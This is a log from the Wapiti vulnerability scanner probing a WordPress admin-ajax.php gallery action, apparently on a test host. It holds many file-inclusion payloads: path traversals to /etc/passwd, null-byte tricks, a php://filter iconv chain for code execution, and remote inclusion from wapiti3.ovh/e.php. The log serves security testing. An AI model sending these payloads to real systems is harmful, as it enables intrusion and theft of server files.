2024-03-21 21:20:47.617 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:48.244 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:48.874 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:49.504 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:50.130 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:50.758 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:51.395 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:52.022 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:52.650 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:53.277 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:53.903 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:54.530 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:55.156 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:55.785 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:56.412 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:57.040 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:57.674 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:58.302 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:58.929 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:59.555 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:00.183 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:00.809 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:01.437 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:02.063 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:02.704 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:03.333 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:03.963 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:04.591 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=file%3A%2F%2F%2Fetc%2Fpasswd&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:05.219 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:05.848 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:06.475 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:07.103 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:07.737 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:08.369 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:08.995 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:09.623 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=admin-ajax.php&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:10.253 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=admin-ajax.php%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:10.885 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=admin-ajax.php%3A%3A%24DATA&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:21:11.518 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:22:11.607 | ORANGE   | wapitiCore.attack.mod_file:attack:287 - ---
2024-03-21 21:22:11.608 | ORANGE   | wapitiCore.attack.mod_file:attack:288 - Received a HTTP 500 error in http://web/wp-admin/admin-ajax.php
2024-03-21 21:22:11.608 | ORANGE   | wapitiCore.attack.mod_file:attack:289 - Evil request:
2024-03-21 21:22:11.608 | ORANGE   | wapitiCore.attack.mod_file:attack:290 -     GET /wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&start=0&action=wpda_gall_load_image_info HTTP/1.1
    host: web
    connection: keep-alive
    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
    accept-language: en-US,en;q=0.5
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    sec-fetch-user: ?1
    sec-fetch-site: none
    sec-fetch-mode: navigate
    sec-fetch-dest: document
    upgrade-insecure-requests: 1
    dnt: 1
2024-03-21 21:22:11.609 | ORANGE   | wapitiCore.attack.mod_file:attack:291 - ---
2024-03-21 21:22:11.609 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:23:11.629 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=%2Fetc%2Fpasswd&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:23:12.293 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=%2Fetc%2Fpasswd%00&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:23:12.917 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=%2Fetc%2Fservices&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:23:13.547 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=%2Fetc%2Fservices%00&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:23:14.171 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&start=0&action=wpda_gall_load_image_info (0)
